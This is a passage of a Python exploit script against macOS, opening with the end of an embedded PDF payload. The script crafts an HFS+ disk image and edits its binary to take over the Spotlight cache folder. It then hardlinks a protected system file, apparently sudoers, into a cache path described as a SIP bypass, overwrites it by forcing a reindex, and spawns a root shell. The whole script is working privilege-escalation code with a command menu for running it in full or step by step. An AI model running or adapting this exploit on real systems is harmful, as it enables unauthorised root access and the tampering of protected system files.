{\xd0c\x08\xf5\xfd\xac\x92\x0b\x92~f\x9bvD\xdar\x0c\xe1\xb0\x92\xd3\xeb0\xdfc,\x82\x00\xd3[X[\x02=\x7f\xb1\x02\x17\xef\x8d>\x16\xdd\x04\xf3y\x15\xa3S<\xc1x\xad\x88\'\x94u\xa5s\xd6\xcf\xa2\x88!\x95\xe6b\x07FB\xfd\x86\x19\xecc\xf9\x0c0m\xdacQEs\x08\xbbN\xfcJ?\xa2\xa2\xebS\xea\x12e>&\x94(\xa9N\x95\x92\xef\x10\xbb&\x98\xdf(\xfa\x10Y|\xe9*\x9f\xef[dy\xf2\xb1\xac\xa7+=\x8a\xdc$\x93\xf5#}\x04?;\x95]6\x8aYI\xfb\x1aR\xf6\xd1\x0e\xb6+\xc3\xca\x8aG\x99]\x91\\\x8d\xf7\x1d\xac+b\xacn\xd1\xb2\xa5\xac\xc6\xe7\xb2\x92\xee\x9b\x90\xd2\xa7"\xd3\x8d#\x1cc\xabX\xc8c5\xab\r]I\x90EJ!\x1f\xdb\xf9C\xa81\xc2|\xa7c\x0b\xb3\xee\xf0\xb1\xda\x06\x95Z\'\xd9\n\x16\xf2\x15PVJ\xa3\x8e3J5q\xb2\xbe\xa0\xfb=\xa8\xe4\xf4\x1a<\'\xba/j1\x9d\xc1\xcc\xde\xa45\x19a\xf1&2lGY\xb4\x81\xc55\xa6\xb3M\xa5F\x14O\xe9\x15\x8f\xb0\xf3\xe8\xfa\xc5\xfa\x84X\xbf\xa53\x1a`\xd6\xaa\xbf$\xe7!\x96\x9b\xa4\xe25\xc6"\n\xe0\']\xf1to\xc5Pw\x9c\xd5#\xbd\x9f\xd2\xdd\x9c\xfcB\xe6|,\xbf1E/\xceN\xa5\xa4\x12\xcb(\xdb\x1fa\xd6\x81qr9\xbeX\xda0:\xfa\xa9a}\x98\xb9k\xfc\xca\x9e\xa9Qb\xb6\xfd\xaf\xf5h\\q\x96\xc1\xcc\xfd1\xb6\x18\xcb(\xc6\xd8\xad\xec\xfe\xe8\xe2\xae\x1b\xcf\xd8\xbf\x0b\x95\xe8\xc33\xa8\x9b\x9d\x17q\xa5\x7f\\J\xe6\xc4\x0b,\xd0]s\xe1\x99Y\xc7\xce\xcc\xf3W\x91\xee\xc6\x08\xe2I\x16O\x82\xe5\xb2\x86\xada\x18\xf9=\xe8\xa1\x9b\xbeC\xb31\xbf\x9b\x04\xc8E\xc6\xb4\xbe\xb7e\x08\x82\x04 \x0c\xc3\xa4\x80X\xc1K\xae\x86A2\x00-\xa4\t\x1cxw \xaf\x15\xefm\x88\xd3{\r4\x91I\x94kB\xfa\x95\x88\xafE\xfa\x15xvZ\xf1\xda\x8c\xb3\x07\xe7\x9d8U8\xd3\x12\xb5(a\xc3\xbbM\xc1\xab\x11\xafB\x8d\x97\xf1\nlRj3R\xe9}=\xe2\x9dx\xefP\xee.\xa4;\xf1\xeeT\xf0u\x88\xe3\x9dxA\x8b/\xe1\xcd\xecz\x0cT\x8e#0w\x16^>\x0b\xe2Y\xd8u\x1azO\xc3\xe4\'\xfb?\xe1\xfe\xfb\xe4J\xeb\xe1\x93\xc7Nr=\x1f\x0f~|\xf8c\xbe\xf6c0|\x0c:r\xc2x\xa2\xf7\x84\xf7D\xfc\xc4\x03\'4Y\x86\x0f!\x87\xfc\x17\x08\xbf\x9f[c}\xa7\xe9\xf8\xc0\xdbMo\r\x90\xe3\xb8\xb2\xe3\xb5\xc7{\x8fO\x1e\x97\x8f\xab\x8f\x03?\xf0\x16o\xb6\x1ag\xc5\xd9\xda\xd9\xf8\xec\xe4\xec+\xb3s\xb3\'gu\x93\xcf\xec\x7f\x86\xfb\xe9\xd36\xab\xe1i\xeb\xd3\x9c\xf5H\xcf\x91]Gx\xef\xa3`x\xd4\xfa(\xd7{\xaf\xf7^n\xff}`\xb8\xcfz\x9f\xed>\xfe\xe0=5\xd6{:\x96X\x7fp`\xb9u\xee\xc0\xc9\x03\xdc\xcc\xfc\xec\x91\x03\xb9\x82\xebi\xe8\x81n\xd2\x849\xbc\xfa\x08?o=\xdcR\x08W\xe1\xb2\x0cx\xb5\xe2\xb4\xe1\xec\xc1\x19\xc3y\'N\xfc\xcd\x83\xe2V\x9c6\xe8v\xac\xe1\x07\xff\x0e\xb2\xef\xb2\xdcUy\xd7Mw\xed\xbdK\x1d\xbfm\xf2\xb6\xfd\xb7\xf1\x93\xbb\xf7\xef\xe6\x0eO\x1c\x9b\xe0\x12\xbd+\xad\xb1h\xa55\xdaq\xa9\xb5\xc4^<\xa0\xb5\xf3\x03\x1at\x83\xde\x1d\xeb\x86\xcaW\xb8\xbc\x83\x0e\xeb \nm\xd9\\k\xdd\xdc\xb1\xd2Z`\xcf\x1fP\xe3\x82U(h\xe0\xad|3\xdf\xc3\xc7\xf8;\xf9c\xbcV\xb7\xb1w\x89u\x03\xce\xb9\xde\x93\xbd\x9c\xa3W\x9f\xe32\xf4X{l=\xfc\xcc\xfc\x9c#\xd8U\x86\xd6\xd6\xc7\xd7O\xae\xe7\xd7\xb9VZ;;\xd6X\r\x1d\xd6\x0e[\xc7\xcb\x1d\xeft|\xdc\xa1\x19\xec\x80\xfb\xf1\xeb:\xec:\xe6\xe2\x1d\xae\x956\x97\xc3\xb5\xa4\xccuI\xa7e\xc0l/\x1c\x10\xc00`\xb4\x1b\x068\xc0B\xdb\xc9\x80\xcd0o\xe0\x0c\x86A\xc3.\x03o \xcd\x84\x9b4\x83\x1af`\xfft\x7f_ee\xd7\x8cv~c\x97\xac\xeb\xdd"\xc3\x1e\xb9\xbc\x8f^\x1d\x1b6\xcb\x9a=2\x19\xd8\xbc\xc5=\r\xf0\x1d\xcf\xee}\xfbH\xeb7\xba\xe4\xfa>\xb7\xec\xfd\x86\xa7K\x0e \xe0\xa0\xc0$\x02\xc6oL\x9bI\xab\'\x91HV\xb2\x01\x95\x95\x08\x8f\xe3\x95T\x8eW"q["M%\x8b|R\x99\x80\x04\x1eQ\t\xa6\x04\x95T \x8d\x03^+)\x0f\tT\x0fP{[\x82\xd0\x0beV\xa6\x95\xa8vB1\xc7\x94\xd3\x17\x06\x14o\xfb\x1f\x11\x04\xea`\nendstream\nendobj\n\n6 0 obj\n5862\nendobj\n\n7 0 obj\n<</Type/FontDescriptor/FontName/BAAAAA+LiberationSerif\n/Flags 4\n/FontBBox[-543 -303 1277 981]/ItalicAngle 0\n/Ascent 891\n/Descent -216\n/CapHeight 981\n/StemV 80\n/FontFile2 5 0 R\n>>\nendobj\n\n8 0 obj\n<</Length 283/Filter/FlateDecode>>\nstream\nx\x9c]\x91Mo\x84 \x10\x86\xef\xfc\n\x8e\xdb\xc3\xc6\xcf\xed\xee&\xc6\xc4jM<\xf4#\xb5\xfd\x01\x08\xa3%\xa9H\x10\x0f\xfe\xfb2\xb0m\x93\x1e \xcf0\xf3\x0e\xc3KTwM\xa7\xa4\x8d^\xcd\xc2{\xb0t\x94J\x18X\x97\xcdp\xa0\x03LR\x91$\xa5Br{\x8b\xfc\xceg\xa6I\xe4\xb4\xfd\xbeZ\x98;5.EA\xa27\x97[\xad\xd9\xe9\xa1\x12\xcb\x00w$z1\x02\x8cT\x13=|\xd4\xbd\x8b\xfbM\xeb/\x98AY\x1a\x93\xb2\xa4\x02F\xd7\xe7\x89\xe9g6C\xe4U\xc7N\xb8\xb4\xb4\xfb\xd1I\xfe\n\xdew\r4\xf5q\x12F\xe1\x8b\x80U3\x0e\x86\xa9\tH\x11\xc7%-\xda\xb6$\xa0\xc4\xbf\\\x92\x05\xc90\xf2Of\\i\xe2J\xe38OJ\xc7i\xe0\x1a9\xf3\x9c\xc6\xc8\xb9\xe7\xacA>\x85\xf3\x0b\xf2}\xe0+\xf29h\x1f\x91/\x81[\xe4\xab\xe7\x93\xefS\x05\xce\x90\x1f\x02\x9f\x91\xebP\x9f#7\xe1\xae\xca\x0f\x7f\x9b\x12\x9f\x81>\xff\xd8C\xf9f\x8c\xb3\xc6\x7f\x86\xf7\x04\xdd\x90\n~\xffK/\x1aU~}\x03\xe1\xcc\x89\xb6\nendstream\nendobj\n\n9 0 obj\n<</Type/Font/Subtype/TrueType/BaseFont/BAAAAA+LiberationSerif\n/FirstChar 0\n/LastChar 13\n/Widths[777 722 610 250 563 333 333 722 722 556 556 943 722 277 ]\n/FontDescriptor 7 0 R\n/ToUnicode 8 0 R\n>>\nendobj\n\n10 0 obj\n<</F1 9 0 R\n>>\nendobj\n\n11 0 obj\n<</Font 10 0 R\n/ProcSet[/PDF/Text]\n>>\nendobj\n\n1 0 obj\n<</Type/Page/Parent 4 0 R/Resources 11 0 R/MediaBox[0 0 612 792]/Group<</S/Transparency/CS/DeviceRGB/I true>>/Contents 2 0 R>>\nendobj\n\n4 0 obj\n<</Type/Pages\n/Resources 11 0 R\n/MediaBox[ 0 0 612 792 ]\n/Kids[ 1 0 R ]\n/Count 1>>\nendobj\n\n12 0 obj\n<</Type/Catalog/Pages 4 0 R\n/OpenAction[1 0 R /XYZ null null 0]\n/Lang(en-US)\n>>\nendobj\n\n13 0 obj\n<</Creator<FEFF005700720069007400650072>\n/Producer<FEFF004C0069006200720065004F0066006600690063006500200037002E0030>\n/CreationDate(D:20211117175500+01\'00\')>>\nendobj\n\nxref\n0 14\n0000000000 65535 f \n0000007073 00000 n \n0000000019 00000 n \n0000000239 00000 n \n0000007216 00000 n \n0000000259 00000 n \n0000006206 00000 n \n0000006227 00000 n \n0000006422 00000 n \n0000006774 00000 n \n0000006986 00000 n \n0000007018 00000 n \n0000007315 00000 n \n0000007412 00000 n \ntrailer\n<</Size 14/Root 12 0 R\n/Info 13 0 R\n/ID [ <E494C6E829C0BDD9901A05993EFF5D76>\n<E494C6E829C0BDD9901A05993EFF5D76> ]\n/DocChecksum /763FC241336923584BF124995D195A8A\n>>\nstartxref\n7587\n%%EOF\n'
# Spotlight waittime, increase this if Cache folder is not being found!
WAITTIME = int(os.getenv("WAITTIME", 30))
# END GLOBALS


class Exploit:
    def __init__(self):
        print("[+] Using waittime: {}".format(WAITTIME))

        print("[+] Creating base dir: {}".format(BASEDIR))
        self.__makedirs_failok(BASEDIR)

        print("[+] Changing CWD to BASEDIR")
        os.chdir(BASEDIR)
        self.__basecwd = os.getcwd()

        print("[+] Current CWD: {}".format(self.__basecwd))

    def __sleep(self, waittime):
        time.sleep(waittime)

    def __makedirs_failok(self, dirname):
        try:
            os.makedirs(dirname)
        except OSError as exc:
            # already exists
            if exc.errno != 17:
                raise

    def __unlink_failok(self, filename):
        try:
            os.unlink(filename)
        except OSError as exc:
            if exc.errno != 2:
                raise

    def __mount(self, failok=False):
        print("[+] Mounting dangervol.dmg")
        try:
            subprocess.check_call("hdiutil attach dangervol.dmg -kernel -readwrite "
                                  "-owners off -nobrowse -mountpoint mnt", shell=True)
        except subprocess.CalledProcessError as exc:
            if not failok:
                raise

    def __umount(self, failok=False):
        print("[+] Umounting mnt")
        try:
            subprocess.check_call("hdiutil detach mnt", shell=True)
        except subprocess.CalledProcessError as exc:
            if not failok:
                raise

    def __rmtree_failok(self, path):
        try:
            shutil.rmtree(path)
        except OSError as exc:
            if exc.errno != 2:
                raise

    def __reindex(self, waittime):
        print("[+] Issuing reindex")
        output = subprocess.check_output("mdutil -E mnt", shell=True)
        if "Indexing enabled." not in output:
            print("[-] ERROR: \"Indexing enabled.\" not found in output!")
            print("OUTPUT:", output)
            exit(1)

        print("[+] Waiting a little ({}s)".format(waittime))
        self.__sleep(waittime)

    def __get_target_inode(self):
        print("[?] Looking for target inode")
        st = os.stat("./mnt/" + PAYLOADFILE)
        target_inode = st.st_ino
        print("[+] Target inode is: {}".format(target_inode))
        return target_inode

    def setup(self):
        print("[+] Creating mount point")
        self.__makedirs_failok("mnt")

        print("[+] Writing out payload file")
        with open(PAYLOADFILE, "wb") as f:
            f.write(PAYLOAD)

    def create_volume_with_contents(self):
        print("[+] Removing old dangervol")
        self.__unlink_failok("dangervol.dmg")

        print("[+] Creating dangervol")
        subprocess.check_call("hdiutil create -size 128m -fs \"HFS+\" "
                              "-volname dangerRRRR dangervol.dmg", shell=True)

        self.__mount()

        print("[+] Wait 3s...")
        self.__sleep(3)

        print("[+] Copying payload")
        shutil.copyfile(PAYLOADFILE, os.path.join("mnt/", PAYLOADFILE))

        print("[+] Turning Spotlight on")
        output = subprocess.check_output("mdutil -i on mnt", shell=True)
        if "Indexing enabled." not in output:
            print("[-] ERROR: \"Indexing enabled.\" not found in output!")
            print("OUTPUT:", output)
            exit(1)

        # TODO: be more programmatical about this
        print("[+] Waiting for {}s".format(WAITTIME))
        self.__sleep(WAITTIME)

        self.__umount()

    def setup_system_cache_dir(self):
        print("[+] Setting up /Library/Caches/com.apple.spotlight/")
        self.__makedirs_failok(os.path.dirname(SIP_BYPASS_PATH))

        print("[+] Setting up hardlink")
        try:
            os.link(TARGET, SIP_BYPASS_PATH)
        except OSError as exc:
            # already exists
            if exc.errno != 17:
                raise
            print("[?] Link at {} already exists".format(SIP_BYPASS_PATH))

    def editbinary(self, step):
        # This is how these entries look like on disk:
        #
        # 00bfe1a0  00 00 00 24 00 00 00 02  00 0f 00 2e 00 53 00 70  |...$.........S.p|
        # 00bfe1b0  00 6f 00 74 00 6c 00 69  00 67 00 68 00 74 00 58  |.o.t.l.i.g.h.t.-|
        # 00bfe1c0  00 56 00 31 00 30 00 30  00 01 00 80 00 00 00 02  |.V.1.0.0........|
        #
        # more info:
        # https://developer.apple.com/library/archive/technotes/tn/tn1150.html#CanonicalDecomposition

        # TODO: Make sure no off-target edits happen!

        PROTECTED_NAME = b'\x00.\x00S\x00p\x00o\x00t\x00l\x00i\x00g\x00h\x00t\x00-\x00V\x001\x000\x000\x00'
        PATCHED_NAME = b'\x00.\x00S\x00p\x00o\x00t\x00l\x00i\x00g\x00h\x00t\x00X\x00V\x001\x000\x000\x00'

        if step == 0:
            # change to .SpotlightXV100
            target = PROTECTED_NAME
            patch = PATCHED_NAME
        else:
            # change back to .Spotlight-V100
            patch = PROTECTED_NAME
            target = PATCHED_NAME

        # NOTE: I know that this is not optimal...
        buf = bytearray()
        with open("dangervol.dmg", "rb") as r:
            buf += r.read()
            for m in re.finditer(target, buf):
                start, end = m.start(), m.end()
                print("[+] Found string", m.group(), start, end)
                buf[start:end] = patch
                print("[+] Patched with {}".format(patch))

        with open("dangervol.dmg", 'wb') as o:
            o.write(buf)

    def takeover_cache_folder(self):
        print("[+] Editing binary to take control over .Spotlight-V100")
        self.editbinary(0)

        self.__mount()

        filename = self.__findfile()
        print("Found filename: {}".format(filename))
        # mnt/.SpotlightXV100/Store-V2/DDC04BD7-3C58-4A81-8369-2724F807DB70/Cache/0000/0000/0000/18.txt

        # yuck...
        cache = os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(filename))))
        print("[+] Cache folder is at: {}".format(cache))

        print("[+] Moving Cache folder to root of volume")
        shutil.move(cache, "mnt/")

        print("[+] Chdir to Cache's parent")
        os.chdir(os.path.dirname(cache))

        print("[+] CWD: {}".format(os.getcwd()))

        print("[+] Creating symlink to ../../../Cache")
        os.symlink("../../../Cache", "Cache")

        print("[+] Chdir back")
        os.chdir(self.__basecwd)

        self.__umount()

        print("[+] Reversing our edit to .Spotlight-V100")
        self.editbinary(1)

    def verify_prerequisites(self):
        print("[+] Verifying SIP_BYPASS_PATH")
        st = os.stat(SIP_BYPASS_PATH)
        print("[?] SIP_BYPASS_PATH is {}: {}".format(SIP_BYPASS_PATH, st))
        # verify: is file, is hardlink, points to sudoers

        target_inode = self.__get_target_inode()

        print("[+] Verify that our Cache folder's file links to SIP_BYPASS_PATH")
        st = os.stat("./mnt/Cache/0000/0000/0000/{}.tmp".format(target_inode))
        print("[?] Cache symlink: {}".format(st))

    def create_symlink_in_cache(self):
        self.__mount()

        target_inode = self.__get_target_inode()

        linkname = "mnt/Cache/0000/0000/0000/{}.tmp".format(target_inode)
        print("[+] Creating symlink {} -> {}".format(linkname, SIP_BYPASS_PATH))
        os.symlink(SIP_BYPASS_PATH, linkname)

        self.__umount()

    def __findfile(self):
        print("[?] Looking for cache folder")
        for root, dirs, files in os.walk("mnt/.SpotlightXV100/Store-V2/",
                                         topdown=True,
                                         onerror=None,
                                         followlinks=False):
            for file in files:
                if file[-4:] != ".txt":
                    continue
                fname = os.path.join(root, file)
                with open(fname, "rb") as f:
                    buf = f.read()
                    if buf == MAGIC:
                        print("[+] Found: {}".format(fname))
                        return fname

        print("[-] Did not find cache folder :(")
        print("Everything was left as it is")
        print("Try setting the WAITTIME env var to a larger number, as Spotlight")
        print("takes some time to produce a Cache folder")
        exit(1)

    def __remove_exploit_dir(self):
        self.__umount(failok=True)

        print("[+] Removing basedir")
        os.chdir("..")
        self.__rmtree_failok(BASEDIR)

    def teardown(self):
        print("[+] Removing SIP bypass directory")
        self.__rmtree_failok(os.path.dirname(SIP_BYPASS_PATH))
        self.__remove_exploit_dir()

    def spawnshell(self):
        print("[+] Enjoy your rootshell :)")
        os.system("sudo /bin/bash")

    def do_exploit(self):
        self.__mount()
        self.__sleep(3)

        self.verify_prerequisites()

        st = os.stat(SIP_BYPASS_PATH)
        target_size = st.st_size
        print("[+] Target file BEFORE: uid: {}, gid: {}, size: {}".format(st.st_uid, st.st_gid, st.st_size))

        self.__reindex(3)

        st = os.stat(SIP_BYPASS_PATH)
        post_exploit_size = st.st_size
        print("[+] Target file AFTER: uid: {}, gid: {}, size: {}".format(st.st_uid, st.st_gid, st.st_size))

        if target_size == post_exploit_size:
            print("[-] Sizes of before and after match, exploit FAILED!")
            exit(1)

        print("[+] File size changed {} -> {}, exploit likely successful".format(target_size, post_exploit_size))

        print(SIGNATURE)

        self.__umount()

    def main(self, cmd):
        if cmd == "exploit":
            print("\n# Step 1: Setup")
            self.setup()

            print("\n# Step 2: Creating volume")
            self.create_volume_with_contents()

            print("\n# Step 3: Taking over folder")
            self.takeover_cache_folder()

            print("\n# Step 4: Setting up system cache dir")
            self.setup_system_cache_dir()

            print("\n# Step 5: Creating symlink on volume")
            self.create_symlink_in_cache()

            print("\n# Step 6: Exploiting")
            self.do_exploit()

            print("\n# Step 7: Cleaning up")
            self.teardown()

            print("\n# Step 8: Spawning shell")
            self.spawnshell()
        elif cmd == "setup":
            self.setup()
        elif cmd == "create_volume_with_contents":
            self.create_volume_with_contents()
        elif cmd == "takeover_cache_folder":
            self.takeover_cache_folder()
        elif cmd == "setup_system_cache_dir":
            self.setup_system_cache_dir()
        elif cmd == "create_symlink_in_cache":
            self.create_symlink_in_cache()
        elif cmd == "verify_prerequisities":
            self.verify_prerequisites()
        elif cmd == "do_exploit":
            self.do_exploit()
        elif cmd == "teardown":
            self.teardown()
        elif cmd == "spawnshell":
            self.spawnshell()
        elif cmd == "prepare_volume":
            print("\n# Step 1: Setup")
            self.setup()

            print("\n# Step 2: Creating volume")
            self.create_volume_with_contents()

            print("\n# Step 3: Taking over folder")
            self.takeover_cache_folder()

            print("\n# Step 4: Creating symlink on volume")
            self.create_symlink_in_cache()

            print("Preparation succeeded, filename is: {}/dangervol.dmg".format(BASEDIR))
        elif cmd == "exploit_prepared_volume":
            print("\n# Step 1: Setting up system cache dir")
            self.setup_system_cache_dir()

            print("\n# Step 2: Exploiting")
            self.do_exploit()

            print("\n# Step 3: Cleaning up")
            self.teardown()

            print("\n# Step 4: Spawning shell")
            self.spawnshell()

            print("All done, don't forget to clean up the files with teardown")
        else:
            print("Error, valid commands: ")
            print("\texploit - perform the full exploit")
            print("Step-by-step commands:")
            print("\tsetup")
            print("\tcreate_volume_with_contents")
            print("\ttakeover_cache_folder")
            print("\tsetup_system_cache_dir")
            print("\tcreate_symlink_in_cache")
            print("\tverify_prerequisities")
            print("\tdo_exploit")
            print("\tteardown")
            print("\tspawnshell")
            print("\n")
            print("To do the exploit with a prepared volume:")
            print("\tprepare_volume")
            print("\texploit_prepared_volume")
            exit(1)


if __name__ == "__main__":
    cmd = ""
    if len(sys.argv) > 1:
        cmd = sys.argv[1]

    exploit = Exploit()
    exploit.main(cmd)
